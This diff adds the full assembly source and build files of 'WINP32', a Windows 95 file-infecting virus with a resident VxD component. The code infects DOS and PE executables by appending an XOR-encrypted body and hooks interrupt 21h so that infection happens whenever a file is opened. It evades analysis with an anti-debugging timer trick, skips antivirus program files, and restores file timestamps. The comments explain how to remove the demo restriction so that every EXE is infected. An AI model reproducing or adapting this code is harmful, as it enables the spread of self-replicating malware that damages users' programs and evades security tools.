@@ -1,0 +1,829 @@
+;     
+;                         ************************
+;                         *  M A D   R O C K E R *
+;                         *       presents:      *
+;                         *      W I N P 3 2     *
+;                         ************************
+;
+;              <------WIN95.EXE.PE-EXE.TSR(VxD).Infector------->
+;
+;  Hi ! This is my first TSR-virus that works under WINDOWS 95.The virus
+;body consists of loader (it necessary for VxD installation from infected
+;file) and VxD-file.If infected program starts virus decrypts loader and
+;VxD-part,checks for presence the VxD-copy and (if virus VxD is already
+;installed) bypasses control to original CS:IP (or RVA).In other case
+;(no answer from VxD-dropper) virus determines the location of IOSUBSYS
+;directory and creates WINP32.VXD in this directory.Virus is harmless so
+;you can launch it without any trouble.Moreover virus code contents the
+;DEMO-switcher (lines 458-459).If DEMO mode enabled virus infects only
+;VICTIMXX.EXE files.
+;
+;Thankes : HellioN , McStar-1 for help and advices.
+;
+;                                                        Mad  Rocker
+;
+
+;---> WINP32.ASM <-----------------------------------------------------------
+
+                .386p
+                .xlist
+                 include vmm.inc
+                .list
+ 
+Declare_Virtual_Device	 WINP32,1,0,WINP32_Control,Undefined_Device_ID ,,,
+
+VxD_LOCKED_DATA_SEG
+VxD_LOCKED_CODE_SEG
+;----------------------------------------------------------------------------
+alloc_size   dd   0
+vir_buffer   dd   0		      ;pointer to VxD copy location
+busy_flag    db   0		      ;this flag controls our work
+victim	     db   80h dup (0)
+file_mode    dw   0		      ;file attributes
+EXE_header   db   60h dup (0)	      ;buffer for EXE header
+WIN_object   db   40 dup (0)	      ;buffer for Object Table item
+rw_buffer    dw   0
+cr_buffer    db   0
+filetime     dw   0		      ;time of file creation
+filedate     dw   0		      ;date of file creation
+PE_pointer   dw   0		      ;pointer to PE-header
+Obj_pointer  dw   0
+;
+;--------------------------Virus   Decryptor  Block--------------------------
+Decryptor:
+             push eax                 ;save registers
+             push esi
+             push ebp
+             xor  al,al
+             out  70h,al
+             db   0e8h                ;CALL command prefix
+             dw   0
+call_address dw   9090h
+             mov  ebp,esp
+             inc  esp
+             inc  esp                 ;anti-debugger
+ X_prefix    db   66h
+	     db   0b9h		      ;MOV (E)CX,length of encrypted block
+crypt_size   dd   0
+	     jmp  $+4
+	     db   0e8h,0
+	     in   al,71h	      ;read seconds from CMOS
+	     mov  ah,al
+	     db   81h		      ;ADD [(E)BP],offset to encrypted block
+BP_prefix    db   46h
+	     db   0
+ADD_value    dd   0
+	     in   al,71h	      ;read seconds from CMOS
+	     dec  esp
+	     dec  esp
+	     xor  al,ah 	      ;if no debugging AL=AH
+	     db   0b4h		      ;MOV AH,key of encryption
+crypt_key    db   0
+	     add  ah,al
+	     cld
+	     pop  esi
+	     mov  edi,esi
+	     push esi
+	     push es
+ES_init      dw   070eh 	      ;PUSH CS-POP ES
+unxor:
+CS_prefix1   db   2eh
+	     lodsb
+	     xor  al,ah 	      ;decrypt byte
+	     stosb		      ;...and replace it
+	     rol  ah,1		      ;change key value
+	     loop unxor
+	     pop  es
+	     retn		      ;return control to VxD_File_Init_Code
+	     db   0e8h
+Decryptor_size	 equ  $-Decryptor
+;
+VxD_File_Init_Code:
+	     pop  ebp
+	     pop  esi
+	     pop  eax		      ;restore registers
+jmp_prefix   db   0e9h		      ;JUMP switcher
+jmp_address  dw   0
+;-------------Installation code for WIN32-program----------------------------
+WIN32_init_code:
+	     pushad		      ;save all registers
+	     push ds
+	     call startup
+startup:
+	     pop  ebp		      ;get EIP value
+	     xor  eax,eax
+	     mov  esi,0bff70000h+3ch
+	     lodsw		      ;get the PE-pointer value
+	     add  eax,0bff70000h      ;+Image Base of KERNEL32.DLL
+	     xchg esi,eax
+	     lodsd		      ;read first 4 bytes from PE-header
+	     cmp  eax,00004550h
+	     jne  bypass_control      ;sorry,we are probable under NT :(
+	     mov  eax,[esi+74h]       ;get the pointer to Export Table
+;---------------------------------------------------------------------------
+;		     Format of Export Directory Table :
+;			   +00	 Export Flags
+;			   +04	 Time/Date Stamp
+;			   +08	 Major Version
+;			   +0A	 Minor Version
+;			   +0C	 Name RVA
+;			   +10	 Ordinal Base
+;			   +14	 Number of entries to Address Table
+;			   +18	 Number of entries to Name ptr Table
+;			   +1C	 Address  Table RVA
+;			   +20	 Name ptr Table RVA
+;			   +24	 Ordinal  Table RVA
+;--------------------------------------------------------------------------
+	     add  eax,0bff70000h+18h
+	     xchg esi,eax
+	     lodsd		      ;get the number of Name exported API
+	     mov  [NumofNames-startup+ebp],eax
+	     lodsd		      ;get the Address Table RVA
+	     add  eax,0bff70000h      ;+Image Base of KERNEL32.DLL
+	     mov  [AddofFunc-startup+ebp],eax
+	     push esi
+	     xchg esi,eax
+;The first item of Address Table is RVA of undocumented function (VXDCALL)
+	     lodsd		      ;get the VXDCALL RVA
+	     add  eax,0bff70000h
+	     mov  [VxDCall_addr-startup+ebp],eax
+	     pop  esi
+	     lodsd		      ;get the RVA of Name ptr Table
+	     add  eax,0bff70000h
+	     mov  [AddofNames-startup+ebp],eax
+	     lodsd		      ;get the RVA of Ordinal Table
+	     add  eax,0bff70000h
+	     mov  [AddofOrdinals-startup+ebp],eax
+;
+	     mov  edx,[NumofNames-startup+ebp]
+	     mov  esi,[AddofNames-startup+ebp]
+	     mov  edi,[AddofOrdinals-startup+ebp]
+; OK,now we have to find the RVA of GetProcAddress API
+search_API:
+	     lodsd		      ;get pointer to API name
+	     add  eax,0bff70000h
+	     push esi
+	     push edi
+	     xchg esi,eax
+	     lea  edi,[GetProc_name-startup+ebp]
+	     mov  ecx,0fh	      ;size of mask
+	     repe cmpsb 	      ;compare with our mask
+	     pop  edi
+	     pop  esi
+	     je   API_found
+	     inc  edi
+	     inc  edi
+	     dec  edx
+	     jnz  search_API
+	     jmp  bypass_control
+API_found:			      ;if API name and our mask are the same
+	     xor  eax,eax
+	     mov  ax,word ptr [edi]   ;index in Ordinal Table
+	     shl  eax,2
+	     mov  esi,[AddofFunc-startup+ebp]
+	     add  esi,eax
+	     lodsd		      ;EAX=GetProcAddress API RVA
+	     add  eax,0bff70000h
+	     mov  [GetProc_RVA-startup+ebp],eax
+;Get the GetSystemDirectoryA RVA
+	     lea  esi,[GetSys_name-startup+ebp]
+	     push esi
+	     push 0bff70000h
+	     call dword ptr [GetProc_RVA-startup+ebp]
+	     mov  [GetSys_RVA-startup+ebp],eax
+;Get the WINDOWS SYSTEM directory
+	     mov  eax,80h	      ;size of buffer
+	     push eax
+	     lea  esi,[VxD_path-startup+ebp]
+	     push esi
+	     call dword ptr [GetSys_RVA-startup+ebp]
+search_end:			      ;we have to determine the end of string
+	     lodsb
+	     or   al,al
+	     jnz  search_end
+	     mov  edi,esi
+	     dec  edi
+	     mov  al,'\'
+	     stosb
+	     lea  esi,[VxD_name-startup+ebp]
+	     mov  ecx,name_size
+	     rep  movsb 	      ;build a full path to WINP32.VXD
+	     mov  eax,0abcdh	      ;ask password
+	     call VxDCall0
+	     cmp  eax,0dcbah	      ;password correct ?
+	     je   bypass_control      ;yes,VxD is already installed
+	     mov  eax,00003c00h
+	     xor  ecx,ecx
+	     lea  edx,[VxD_path-startup+ebp]
+	     call VxDCall0	      ;create WINP32.VXD
+	     jc   bypass_control
+	     xchg ebx,eax	      ;store file handle in EBX
+	     xor  ecx,ecx
+	     mov  eax,ecx
+	     lea  esi,[vir_size-startup+ebp]
+	     lodsw
+	     mov  ecx,eax	      ;ECX=size of VxD part
+	     mov  edx,esi
+	     mov  eax,00004000h
+	     call VxDCall0	      ;write VxD code to WINP32.VXD
+	     mov  ah,3eh
+	     call VxDCall0	      ;close WINP32.VXD
+bypass_control:
+	     pop  ds
+	     popad		      ;restore registers
+	     db   68h		      ;push original RVA
+RVA	     dd   0
+	     ret		      ;return control to original program
+VxDCall0:			      ;this procedure calls VWIN32 Int_21h
+	     lea  esi,[VxDCall0_ret-startup+ebp]
+	     push ecx
+	     push eax
+	     push 002a0010h	      ;VWIN32 ID,Int_21h_Dispatcher
+	     push esi
+	     db   68h
+VxDCall_addr dd   0
+	     ret
+VxDCall0_ret:
+	     ret
+GetProc_name  db  'GetProcAddress',0
+GetProc_RVA   dd  0
+GetSys_name   db  'GetSystemDirectoryA',0
+GetSys_RVA    dd  0
+;
+;some data from Export Directory Table
+NumofNames    dd  0
+AddofFunc     dd  0
+AddofNames    dd  0
+AddofOrdinals dd  0
+WIN32_code_size  equ $-WIN32_init_code
+;------------Installation code for usual DOS-program------------------------
+DOS_init_code:
+	     push ds
+	     push es		      ;save segment registers
+	     db   0e8h,0,0
+DOS_entrypoint:
+	     pop  esi		      ;get current IP
+	     push cs
+	     pop  ds		      ;DS=CS
+	     db   66h
+	     mov  eax,0abcdh
+	     int  21h		      ;ask VxD password
+	     db   66h
+	     cmp  eax,0dcbah	      ;password correct ?
+	     jne  short install_VxD
+	     db   0e9h
+	     dw   prepare_exit-install_VxD
+install_VxD:			      ;install virus VxD in the system
+	     push es
+	     db   66h
+	     mov  eax,1613h	      ;get the path of register file
+	     push cs
+	     pop  es
+	     mov  edi,esi
+	     db   66h
+	     add  edi,VxD_path-DOS_entrypoint
+	     db   66h
+	     mov  ecx,80h	      ;size of buffer
+	     int  2fh
+	     pop  es
+	     or   eax,eax	      ;there are no errors,if AX=0
+	     jnz  short prepare_exit
+	     push es
+	     push esi
+	     push cs
+	     pop  es
+	     mov  al,'.'	      ;search the start of extension
+				      ;(we have to discard it)
+	     repne scasb
+	     mov  al,'\'
+	     dec  edi
+	     stosb
+	     db   66h
+	     add  esi,VxD_name-DOS_entrypoint
+	     db   66h
+	     mov  ecx,name_size
+	     rep  movsb 	     ;build a full path to WINP32.VXD
+	     pop  esi
+	     pop  es
+	     mov  ah,3ch	     ;create WINP32.VXD
+	     mov  edx,esi
+	     db   66h
+	     add  edx,VxD_path-DOS_entrypoint
+	     xor  ecx,ecx
+	     int  21h
+	     jc   short prepare_exit
+	     xchg eax,ebx	     ;store file handle
+	     push esi
+	     db   66h
+	     add  esi,vir_size-DOS_entrypoint
+	     lodsd
+	     mov  ecx,eax	     ;CX=size of VXD part
+	     mov  edx,esi
+	     mov  ah,40h
+	     int  21h		     ;write VXD code to WINP32.VXD
+	     pop  esi
+	     mov  ah,3eh
+	     int  21h		     ;close file
+prepare_exit:			     ;standard exit from EXE program
+	     xor  dx,dx
+	     mov  edx,es	     ;DX=PSP
+	     db   66h
+	     add  edx,10h
+	     push cs
+	     pop  es
+	     db   66h
+	     add  esi,old_CS-DOS_entrypoint
+	     mov  edi,esi
+	     lodsd		     ;AX=original CS value
+	     add  eax,edx	     ;add with PSP+10h
+	     stosd
+	     lodsd		     ;AX=original SS value
+	     add  eax,edx	     ;add with PSP+10h
+	     stosd
+	     pop  es
+	     pop  ds
+	     cli
+	     mov  ss,eax	     ;initialize the stack segment
+	     xor  eax,eax	     ;clear registers
+	     xor  ebx,ebx
+	     xor  ecx,ecx
+	     xor  edx,edx
+	     xor  esi,esi
+	     xor  edi,edi
+	     sti
+	     jmp  $+2		     ;break prefetch
+	     db   0eah		     ;FAR JUMP to original CS:IP
+old_IP	     dw   0
+old_CS	     dw   0
+old_SS	     dw   0
+;
+VxD_path     db   80h dup (0)
+VxD_name     db   'IOSUBSYS\WINP32.VXD',0
+name_size    equ  $-VxD_name
+vir_size     dw   0
+Init_Size    equ  $-VxD_File_Init_Code
+;
+;--------This code will be executed during initialization of our VxD---------
+;
+BeginProc    WINP32_Init_Complete
+	     VMMCall Get_Exec_Path	;get the path of VMM32.VXD location
+	     cld
+	     mov  esi,edx
+	     mov  edi,offset32 VxD_path
+	     push edi
+	     rep  movsb
+	     mov  esi,offset32 VxD_name
+	     mov  ecx,name_size
+	     rep  movsb 		;create the path to our VXD
+	     mov  ax,3d00h
+	     pop  edx
+	     VxDint 21h 		;open our WINP32.VXD
+	     jc   short error
+	     xchg bx,ax 		;store file handle
+	     xor  eax,eax
+	     mov  ax,4202h
+	     xor  cx,cx
+	     cwd
+	     VxDint 21h 		;get the size of our VXD
+	     mov  alloc_size,eax
+	     mov  vir_size,ax
+	     VMMCall _HeapAllocate <alloc_size,HeapZeroInit>
+	     or   eax,eax
+	     jz   short error
+	     mov  vir_buffer,eax	;store the address of reserved space
+	     mov  ax,4200h
+	     xor  cx,cx
+	     cwd
+	     VxDint 21h 		;move pointer to the start of file
+	     mov  ah,3fh
+	     mov  cx,vir_size
+	     mov  edx,vir_buffer
+	     VxDint 21h 		;read VXD to reserved memory block
+	     mov  ah,3eh
+	     VxDint 21h 		;close file
+	     mov  eax,21h
+	     mov  esi,offset32	My_DOS_handler
+	     VMMCall Hook_V86_Int_Chain ;set V86 interrupt 21h to our VXD
+	     clc
+	     ret
+error:
+	     clc
+	     ret
+EndProc      WINP32_Init_Complete
+;
+BeginProc    WINP32_Control
+	     Control_Dispatch Init_Complete,WINP32_Init_Complete
+	     clc
+	     ret
+EndProc      WINP32_Control
+;
+;-----Our handler of V86 interrupt 21h.We take a control every time when-----
+;-----------the system try to execute DOS ,WIN16 and WIN32 programs----------
+;
+BeginProc    My_DOS_handler
+	     cmp  busy_flag,1
+	     je   out_handler
+	     cmp  [ebp.Client_AH],3dh
+	     jne  test_password
+	     Push_Client_State
+	     VMMCall Begin_Nest_Exec
+	     mov   busy_flag,1		  ;while we try to infect file
+					  ;our handler must be closed
+	     movzx edx,[ebp.Client_DS]
+	     movzx eax,[ebp.Client_DX]
+	     shl   edx,4
+	     add   edx,eax		  ;EDX->name of file
+	     mov   esi,edx
+	     mov   edi,offset32 victim
+	     cld
+scan_zero:				  ;search the end of name
+	     lodsb
+	     stosb
+	     or    al,al
+	     jnz   scan_zero
+	     sub   esi,5
+	     cmp   dword ptr [esi],'EXE.' ;that must be an executable file
+	     jne   finish
+;test the name of file for foolish antivirus words
+	     sub   esi,3
+	     cmp   word ptr  [esi],'VA'   ;AVP
+	     je    finish
+	     dec   esi
+	     cmp   dword ptr [esi],'NACS' ;SCAN
+	     je    finish
+	     dec   esi
+	     cmp   dword ptr [esi],'EWRD' ;DRWE[B]
+	     je    finish
+	     dec   esi
+	     dec   esi
+	     cmp   dword ptr  [esi],'VABT';TBAV
+	     je    finish
+	     dec   esi
+	     cmp   dword ptr  [esi],'SDIA';AIDS[TEST]
+	     je    finish
+;In DEMO version virus infects files VICTIMXX.EXE .If you want to get
+;the "normal" virus,you have to erase two strings below
+	     cmp   dword ptr [esi],'TCIV' ;VICT[IMXX]
+	     jne   finish
+;
+	     mov   ax,4300h
+	     mov   edx,offset32 victim
+	     VxDint 21h 		  ;get file attributes
+	     jc    finish
+	     mov   file_mode,cx 	  ;save it
+	     xor   cx,cx
+	     mov   ax,4301h
+	     VxDint 21h 		  ;set NULL attribute
+;
+	     mov   ax,3d02h		  ;open file with read/write access
+	     VxDint 21h
+	     jc    finish
+	     xchg  bx,ax		  ;store file descriptor
+	     mov   ah,3fh		  ;read the first 60h bytes
+	     mov   cx,60h
+	     mov   edx,offset32 EXE_header
+	     VxDint 21h
+	     cmp   word ptr [EXE_header],'ZM'
+	     jne   close_file		  ;unfortunatly,this file can't
+					  ;be infected
+	     mov   ax,word ptr [EXE_header+12h]
+	     xor   ah,al
+	     cmp   ah,'M'
+	     je    close_file		  ;file is already infected !
+	     mov   ax,5700h
+	     VxDint 21h 		  ;get file creation time
+	     mov   filetime,cx
+	     mov   filedate,dx		  ;save it
+	     mov   ax,4200h
+	     xor   cx,cx
+	     mov   dx,word ptr [EXE_header+3ch]
+	     mov   PE_pointer,dx	  ;try to set file pointer to
+					  ;WINDOWS-OS/2 header
+	     VxDint 21h
+	     mov   ah,3fh
+	     mov   cx,2
+	     mov   edx,offset32 rw_buffer
+	     VxDint 21h 		  ;read the possible PE-signature
+	     mov   ax,4200h
+	     xor   cx,cx
+	     cwd
+	     VxDint  21h		  ;move pointer to the start of file
+	     mov   ax,rw_buffer
+	     cmp   ax,'EN'		  ;NEW EXECUTABLEs aren't supported
+					  ;by this version
+	     je    close_file
+	     cmp   ax,'XL'		  ;the same situation
+	     je    close_file
+	     cmp   ax,'EP'		  ;PORTABLE EXECUTABLE is our client!
+	     je    WIN32_EXE
+DOS_EXE:
+;Save important fields (IP,CS and SS values) from DOS EXE-header
+	     mov   ax,word ptr [EXE_header+14h]
+	     mov   dx,word ptr [EXE_header+16h]
+	     mov   cx,word ptr [EXE_header+0eh]
+	     mov   old_IP,ax
+	     mov   old_CS,dx
+	     mov   old_SS,cx
+	     mov   ax,4202h
+	     xor   cx,cx
+	     cwd
+	     VxDint 21h 		  ;move pointer to the end of file
+	     push  eax
+	     push  edx
+	     mov   cx,200h
+	     div   cx			  ;AX:DX=length of file in 512-byte
+					  ;pages
+	     cmp   ax,word ptr [EXE_header+4]
+	     pop   edx
+	     pop   eax
+	     ja    close_file		  ;this file probably contains
+					  ;internal overlay...
+	     push  eax
+	     push  edx
+	     add   ax,Init_Size 	  ;+ size of initialization code
+	     adc   dx,0
+	     add   ax,vir_size		  ;+ size of VxD part
+	     adc   dx,0
+	     div   cx
+	     or    dx,dx
+	     jz    $+4
+	     inc   ax
+;build a new image size in 512-byte pages
+	     mov   word ptr [EXE_header+2],dx
+	     mov   word ptr [EXE_header+4],ax
+	     pop   edx
+	     pop   eax
+	     mov   cx,10h
+	     div   cx			 ;AX:DX=file size in paragraphes
+	     sub   ax,word ptr [EXE_header+8]
+;build a new start address
+	     mov   word ptr [EXE_header+14h],dx
+	     mov   word ptr [EXE_header+16h],ax
+	     xchg  eax,edx
+	     push  edx
+	     mov   ax,vir_size		 ;AX=size of VxD part
+	     add   ax,Init_Size 	 ;+ size of initialization code
+	     xor   dx,dx
+	     div   cx
+	     inc   ax
+	     pop   edx
+	     add   ax,dx
+;build a new SS value
+	     mov   word ptr [EXE_header+0eh],ax
+	     mov   ax,filetime
+	     mov   ah,'M'		 ;ID of infection
+	     xor   ah,al
+;move to CRC location the ID of infected file
+	     mov   word ptr [EXE_header+12h],ax
+;update some fields of virus decryptor
+	     mov   call_address,9090h	 ;for V86 mode CALL command
+	     mov   BP_prefix,46h
+	     mov   word ptr ADD_value,VxD_File_Init_Code-call_address
+	     mov   word ptr ADD_value+2,9090h
+	     mov   CX_prefix,66h
+	     xor   eax,eax
+	     mov   ax,vir_size
+	     add   eax,Init_Size
+	     mov   crypt_size,eax
+	     mov   CS_prefix1,2eh
+	     mov   ES_init,070eh	 ;PUSH CS-POP ES
+	     mov   jmp_prefix,0e9h
+	     mov   jmp_address,DOS_Init_Code-WIN32_Init_Code
+	     call  WRITE_VIRUS		 ;write virus body to file
+	     mov   ax,4200h
+	     xor   cx,cx
+	     cwd
+	     VxDint 21h 		 ;move file pointer to the start
+	     mov   ah,40h
+	     mov   cx,60h
+	     mov   edx,offset32 EXE_header
+	     VxDint 21h 		 ;write updated DOS EXE header
+
+	     jmp   close_file
+WIN32_EXE:				 ;if our file is a Portable EXE
+	     mov   ax,filetime
+	     mov   ah,'M'		 ;ID of infection
+	     xor   ah,al		 ;encrypt ID with file creation time
+	     mov   word ptr [EXE_header+12h],ax
+	     mov   ah,40h
+	     mov   cx,60h
+	     mov   edx,offset32 EXE_header
+	     VxDint  21h		 ;write updated DOS EXE header
+	     mov   ax,4200h
+	     xor   cx,cx
+	     mov   dx,PE_pointer
+	     VxDint  21h		 ;move pointer to start of PE-header
+	     mov   ah,3fh
+	     mov   cx,60h
+	     mov   edx,offset32 EXE_header
+	     VxDint 21h 		 ;read PE-header
+	     mov   ax,word ptr [EXE_header+6]  ;AX=number of objects
+	     dec   ax
+	     mov   cx,40		       ;CX=size of object
+	     mul   cx			       ;AX=size of object table
+					       ;without one object
+	     add   ax,18h
+	     add   ax,word ptr [EXE_header+14h];+ NT header size
+	     add   ax,PE_pointer	       ;+ pointer to PE-header
+	     mov   Obj_pointer,ax	       ;save pointer to object table
+	     mov   dx,ax
+	     xor   cx,cx
+	     mov   ax,4200h
+	     VxDint 21h 	 ;move file pointer to last object
+	     mov   ah,3fh
+	     mov   cx,40
+	     mov   edx,offset32 WIN_object
+	     VxDint 21h 	 ;read the last object
+
+;-------We have to update the last object and the main PE header------------
+
+	     mov   eax,dword ptr [EXE_header+28h] ;EAX=RVA entrypoint
+	     add   eax,dword ptr [EXE_header+34h] ;+ Image Base
+	     mov   RVA,eax	 ;store entrypoint
+	     mov   eax,dword ptr [WIN_object+0ch] ;Object RVA
+	     add   eax,dword ptr [WIN_object+8]   ;+ Object virtual size
+	     mov   dword ptr [EXE_header+28h],eax ;new RVA entrypoint
+	     xor   eax,eax
+	     xor   edx,edx
+	     mov   ax,vir_size
+	     add   eax,Init_Size		  ;size of virus code in file
+	     push  eax
+	     mov   ecx,dword ptr [EXE_header+3ch] ;File align factor
+	     div   ecx
+	     inc   eax
+	     mul   ecx
+	     add   eax,dword ptr [WIN_object+8]   ;+ Object virtual size
+	     mov   dword ptr [WIN_object+10h],eax ;new Object physical size
+	     pop   eax
+	     xor   edx,edx
+	     mov   ecx,dword ptr [EXE_header+38h] ;Object align factor
+	     div   ecx
+	     inc   eax
+	     mul   ecx
+	     add   eax,dword ptr [WIN_object+8]   ;+ Object virtual size
+	     mov   dword ptr [WIN_object+8],eax   ;new Object virtual size
+	     mov   dword ptr [WIN_object+24h],0e0000040h ;Object flags
+	     add   eax,dword ptr [WIN_object+0ch] ;+ Object RVA
+	     mov   dword ptr [EXE_header+50h],eax ;new Image Size
+	     mov   call_address,0
+	     mov   BP_prefix,45h
+	     mov   eax,VxD_File_Init_Code-call_address-2
+	     mov   ADD_value,eax
+	     mov   CX_prefix,90h
+	     xor   eax,eax
+	     mov   ax,vir_size
+	     add   eax,Init_Size
+	     mov   crypt_size,eax
+	     mov   CS_prefix1,90h
+	     mov   ES_init,00ebh
+	     mov   jmp_prefix,0ebh
+	     mov   jmp_address,9000h
+
+;-----Well , all important fields are updated.Now we can write the virus-----
+;------------------------code to the end of file-----------------------------
+
+	     mov   ax,4202h
+	     xor   cx,cx
+	     cwd
+	     VxDint 21h 		 ;move pointer to the end of file
+	     call  WRITE_VIRUS		 ;write virus body to file
+	     mov   ax,4200h
+	     xor   cx,cx
+	     mov   dx,Obj_pointer
+	     VxDint 21h 		 ;move pointer to the last object
+	     mov   ah,40h
+	     mov   cx,40
+	     mov   edx,offset32 WIN_object
+	     VxDint 21h 		 ;write updated last object
+	     mov   ax,4200h
+	     xor   cx,cx
+	     mov   dx,PE_pointer
+	     VxDint 21h 		 ;move pointer to PE-header
+	     mov   ah,40h
+	     mov   cx,60h
+	     mov   edx,offset32 EXE_header
+	     VxDint 21h 		 ;write PE-header
+close_file:
+	     mov   ax,5701h
+	     mov   cx,filetime
+	     mov   dx,filedate
+	     VxDint 21h 		 ;set an old creation time to file
+	     mov   ah,3eh
+	     VxDint 21h 		 ;close file
+finish:
+	     mov   ax,4301h
+	     mov   cx,file_mode
+	     mov   edx,offset32 victim
+	     VxDint 21h 		 ;restore file attributes
+	     mov   busy_flag,0
+	     VMMCall End_Nest_Exec
+	     Pop_Client_State		 ;restore CLIENT registers
+	     jmp  short Out_handler	 ;bypass control to next handler
+Test_password:
+	     cmp  [ebp.Client_AX],0abcdh
+	     jne  out_handler
+	     mov  [ebp.Client_AX],0dcbah
+	     clc
+	     ret
+Out_handler:
+	     stc
+	     ret
+EndProc      My_DOS_handler
+
+BeginProc    WRITE_VIRUS		;encryptes and writes virus body
+	     cld
+	     mov   ah,2ch
+	     VxDint 21h 		;get system time
+	     rol   dh,cl
+	     xor   dh,dl
+	     mov   crypt_key,dh 	;get key of encryption
+	     mov   ah,40h
+	     mov   cx,Decryptor_size
+	     mov   edx,offset32 Decryptor
+	     VxDint 21h 		;write decryptor to file
+	     mov   esi,offset32 VxD_File_Init_Code
+encrypt_Init_Code:			;encrypt one byte from initialization
+					;code and write it to file
+	     lodsb			;get byte
+	     xor   al,crypt_key 	;encrypt it
+	     mov   cr_buffer,al 	;replace it to buffer
+	     rol   crypt_key,1		;modify the key of encryption
+	     mov   ah,40h
+	     mov   cx,1
+	     mov   edx,offset32 cr_buffer
+	     VxDint 21h 		;write encrypted byte
+	     cmp   esi,offset32 vir_size+2
+	     jb    encrypt_Init_Code
+	     mov   esi,vir_buffer	;address of VxD image
+	     mov   edi,esi
+	     mov   cx,vir_size		;size of virus VxD block
+	     push  ecx
+encrypt_VxD_buffer:
+	     lodsb			;get byte from VxD block
+	     xor   al,crypt_key 	;encrypt it
+	     rol   crypt_key,1		;modify the key
+	     stosb			;replace it
+	     loop  encrypt_VxD_buffer
+	     mov   ah,40h
+	     mov   cx,vir_size
+	     mov   edx,vir_buffer
+	     VxDint 21h 		;write encrypted VxD block to file
+	     pop   ecx
+	     inc   ecx
+	     std
+decrypt_VxD_buffer:			;decrypt VxD image in memory
+	     lodsb
+	     xor   al,crypt_key
+	     ror   crypt_key,1
+	     stosb
+	     loop  decrypt_VxD_buffer
+	     cld
+	     clc
+	     ret
+EndProc      WRITE_VIRUS
+;----------------------------------------------------------------------------
+VxD_LOCKED_CODE_ENDS
+VxD_LOCKED_DATA_ENDS
+         END
+
+;---> WINP32.ASM <-----------------------------------------------------------
+
+;---> WINP32.BAT <-----------------------------------------------------------
+
+ml -coff -DBLD_COFF -DIS_32 -W2 -Fl -c -Cx -Zd -Ic:\ddk\win_95\include -DMASM6 winp32.asm
+link /VXD /NOD /MAP winp32.obj /DEF:winp32.def
+mapsym -s -o winp32.sym winp32.map
+
+;---> WINP32.BAT <-----------------------------------------------------------
+
+;---> WINP32.DEF <-----------------------------------------------------------
+
+VXD WINP32 DYNAMIC
+
+DESCRIPTION ''
+
+SEGMENTS
+    _LPTEXT	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    _LTEXT	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    _LDATA	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    _TEXT	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    _DATA	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    CONST	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    _TLS	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    _BSS	CLASS 'LCODE'	PRELOAD NONDISCARDABLE
+    _ITEXT	CLASS 'ICODE'	DISCARDABLE
+    _IDATA	CLASS 'ICODE'	DISCARDABLE
+    _PTEXT	CLASS 'PCODE'	NONDISCARDABLE
+    _PDATA	CLASS 'PDATA'	NONDISCARDABLE SHARED
+    _STEXT	CLASS 'SCODE'	RESIDENT
+    _SDATA	CLASS 'SCODE'	RESIDENT
+    _DBOSTART	CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
+    _DBOCODE	CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
+    _DBODATA	CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
+    _16ICODE	CLASS '16ICODE' PRELOAD DISCARDABLE
+    _RCODE	CLASS 'RCODE'
+
+EXPORTS
+	WINP32_DDB @1
+
+;---> WINP32.DEF <-----------------------------------------------------------
